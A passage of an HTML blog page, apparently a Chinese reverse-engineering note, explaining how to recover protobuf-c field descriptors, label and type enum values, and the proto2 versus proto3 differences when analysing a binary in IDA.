+</span></span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">reserved</span><span class="p">;</span>       <span class="c1">// 0x34
+</span></span></span><span class="line"><span class="cl"><span class="p">};</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
+</div>
+</div><p>导入IDA的话：</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-c"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">typedef</span> <span class="nf">void</span> <span class="p">(</span><span class="kr">__fastcall</span> <span class="o">*</span><span class="n">ProtobufCMessageInit</span><span class="p">)(</span><span class="kt">void</span> <span class="o">*</span><span class="n">msg</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">ProtobufCIntRange</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">start_value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">orig_index</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">ProtobufCFieldDescriptor</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">id</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">label</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">type</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">quantifier_offset</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">offset</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">void</span> <span class="o">*</span><span class="n">descriptor</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">void</span> <span class="o">*</span><span class="n">default_value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">reserved1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">reserved2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">reserved3</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
+</div>
+</div><ul>
+<li>name：字段名。</li>
+<li>id：唯一字段编号。</li>
+<li>label：修饰符，如：required、optional、repeated。</li>
+<li>type：数据类型，如：bool、int32、float、double等。</li>
+</ul>
+<h5 class="heading-element" id="id"><span><strong>id</strong></span>
+  <a href="#id" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">.data.rel.ro:0000000000003A70                 db    2
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003A71                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003A72                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003A73                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003A74                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003A75                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003A76                 db    0
+</span></span><span class="line"><span class="cl">.data.rel.ro:0000000000003A77                 db    0</span></span></code></pre></td></tr></table></div>
+</div>
+</div><p>这里的<code>2</code>就是：</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-c"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">  <span class="n">required</span> <span class="n">string</span> <span class="n">name</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span></span></span></code></pre></td></tr></table></div>
+</div>
+</div><h5 class="heading-element" id="label"><span><strong>label</strong></span>
+  <a href="#label" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-c"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">enum</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="cm">/** A well-formed message must have exactly one of this field. */</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PROTOBUF_C_LABEL_REQUIRED</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="cm">/**
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * A well-formed message can have zero or one of this field (but not
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * more than one).
+</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PROTOBUF_C_LABEL_OPTIONAL</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="cm">/**
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * This field can be repeated any number of times (including zero) in a
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * well-formed message. The order of the repeated values will be
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * preserved.
+</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PROTOBUF_C_LABEL_REPEATED</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="cm">/**
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * This field has no label. This is valid only in proto3 and is
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * equivalent to OPTIONAL but no &#34;has&#34; quantifier will be consulted.
+</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PROTOBUF_C_LABEL_NONE</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">ProtobufCLabel</span><span class="p">;</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
+</div>
+</div><p>对应关系</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-c"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">enum</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PROTOBUF_C_LABEL_REQUIRED</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>  
+</span></span><span class="line"><span class="cl">    <span class="n">PROTOBUF_C_LABEL_OPTIONAL</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>  
+</span></span><span class="line"><span class="cl">    <span class="n">PROTOBUF_C_LABEL_REPEATED</span> <span class="o">=</span> <span class="mi">2</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">    <span class="n">PROTOBUF_C_LABEL_NONE</span> <span class="o">=</span> <span class="mi">3</span> 
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">ProtobufCLabel</span><span class="p">;</span></span></span></code></pre></td></tr></table></div>
+</div>
+</div><h5 class="heading-element" id="type"><span><strong>type</strong></span>
+  <a href="#type" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>这里的<code>E</code>就是对应的类型，也就是<code>string</code></p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-c"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">enum</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="n">PROTOBUF_C_TYPE_INT32</span><span class="p">,</span>      <span class="cm">/**&lt; int32 */</span>
+</span></span><span class="line"><span class="cl">	<span class="n">PROTOBUF_C_TYPE_SINT32</span><span class="p">,</span>     <span class="cm">/**&lt; signed int32 */</span>
+</span></span><span class="line"><span class="cl">	<span class="n">PROTOBUF_C_TYPE_SFIXED32</span><span class="p">,</span>   <span class="cm">/**&lt; signed int32 (4 bytes) */</span>
+</span></span><span class="line"><span class="cl">	<span class="n">PROTOBUF_C_TYPE_INT64</span><span class="p">,</span>      <span class="cm">/**&lt; int64 */</span>
+</span></span><span class="line"><span class="cl">	<span class="n">PROTOBUF_C_TYPE_SINT64</span><span class="p">,</span>     <span class="cm">/**&lt; signed int64 */</span>
+</span></span><span class="line"><span class="cl">	<span class="n">PROTOBUF_C_TYPE_SFIXED64</span><span class="p">,</span>   <span class="cm">/**&lt; signed int64 (8 bytes) */</span>
+</span></span><span class="line"><span class="cl">	<span class="n">PROTOBUF_C_TYPE_UINT32</span><span class="p">,</span>     <span class="cm">/**&lt; unsigned int32 */</span>
+</span></span><span class="line"><span class="cl">	<span class="n">PROTOBUF_C_TYPE_FIXED32</span><span class="p">,</span>    <span class="cm">/**&lt; unsigned int32 (4 bytes) */</span>
+</span></span><span class="line"><span class="cl">	<span class="n">PROTOBUF_C_TYPE_UINT64</span><span class="p">,</span>     <span class="cm">/**&lt; unsigned int64 */</span>
+</span></span><span class="line"><span class="cl">	<span class="n">PROTOBUF_C_TYPE_FIXED64</span><span class="p">,</span>    <span class="cm">/**&lt; unsigned int64 (8 bytes) */</span>
+</span></span><span class="line"><span class="cl">	<span class="n">PROTOBUF_C_TYPE_FLOAT</span><span class="p">,</span>      <span class="cm">/**&lt; float */</span>
+</span></span><span class="line"><span class="cl">	<span class="n">PROTOBUF_C_TYPE_DOUBLE</span><span class="p">,</span>     <span class="cm">/**&lt; double */</span>
+</span></span><span class="line"><span class="cl">	<span class="n">PROTOBUF_C_TYPE_BOOL</span><span class="p">,</span>       <span class="cm">/**&lt; boolean */</span>
+</span></span><span class="line"><span class="cl">	<span class="n">PROTOBUF_C_TYPE_ENUM</span><span class="p">,</span>       <span class="cm">/**&lt; enumerated type */</span>
+</span></span><span class="line"><span class="cl">	<span class="n">PROTOBUF_C_TYPE_STRING</span><span class="p">,</span>     <span class="cm">/**&lt; UTF-8 or ASCII string */</span>
+</span></span><span class="line"><span class="cl">	<span class="n">PROTOBUF_C_TYPE_BYTES</span><span class="p">,</span>      <span class="cm">/**&lt; arbitrary byte sequence */</span>
+</span></span><span class="line"><span class="cl">	<span class="n">PROTOBUF_C_TYPE_MESSAGE</span><span class="p">,</span>    <span class="cm">/**&lt; nested message */</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">ProtobufCType</span><span class="p">;</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
+</div>
+</div><div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PROTOBUF_C_TYPE_INT32      = 0
+</span></span><span class="line"><span class="cl">PROTOBUF_C_TYPE_SINT32     = 1
+</span></span><span class="line"><span class="cl">PROTOBUF_C_TYPE_SFIXED32   = 2
+</span></span><span class="line"><span class="cl">PROTOBUF_C_TYPE_INT64      = 3
+</span></span><span class="line"><span class="cl">PROTOBUF_C_TYPE_SINT64     = 4
+</span></span><span class="line"><span class="cl">PROTOBUF_C_TYPE_SFIXED64   = 5
+</span></span><span class="line"><span class="cl">PROTOBUF_C_TYPE_UINT32     = 6
+</span></span><span class="line"><span class="cl">PROTOBUF_C_TYPE_FIXED32    = 7
+</span></span><span class="line"><span class="cl">PROTOBUF_C_TYPE_UINT64     = 8
+</span></span><span class="line"><span class="cl">PROTOBUF_C_TYPE_FIXED64    = 9
+</span></span><span class="line"><span class="cl">PROTOBUF_C_TYPE_FLOAT      = 10
+</span></span><span class="line"><span class="cl">PROTOBUF_C_TYPE_DOUBLE     = 11
+</span></span><span class="line"><span class="cl">PROTOBUF_C_TYPE_BOOL       = 12
+</span></span><span class="line"><span class="cl">PROTOBUF_C_TYPE_ENUM       = 13
+</span></span><span class="line"><span class="cl">PROTOBUF_C_TYPE_STRING     = 14
+</span></span><span class="line"><span class="cl">PROTOBUF_C_TYPE_BYTES      = 15
+</span></span><span class="line"><span class="cl">PROTOBUF_C_TYPE_MESSAGE    = 16</span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
+</div>
+</div><h4 class="heading-element" id="版本"><span>版本</span>
+  <a href="#%e7%89%88%e6%9c%ac" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><ul>
+<li>
+<p>在proto3中，删除了字段的默认值，因此ProtobufCFieldDescriptor结构体中没有了default_value字段。</p>
+<p>可以根据逆向后字段的数量来判断题目用的proto版本。</p>
+<p>也就是结构体变成了0x40大小</p>
+</li>
+<li>
+<p>也可以根据特点：</p>
+<p><strong>Proto2</strong>: 支持 <code>required</code> 和 <code>optional</code> 修饰符。</p>
+<p><strong>Proto3</strong>: 默认所有字段为 <code>optional</code>，不支持 <code>required</code></p>
+</li>
+</ul>
+<h4 class="heading-element" id="偏移问题"><span>偏移问题</span>
+  <a href="#%e5%81%8f%e7%a7%bb%e9%97%ae%e9%a2%98" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>有时候我们的<code>proto</code>文件：</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-protobuf"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-protobuf" data-lang="protobuf"><span class="line"><span class="cl"> <span class="n">syntax</span> <span class="o">=</span> <span class="s">&#34;proto2&#34;</span><span class="p">;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"> <span class="kd">message</span> <span class="nc">Message_request</span><span class="p">{</span><span class="err">
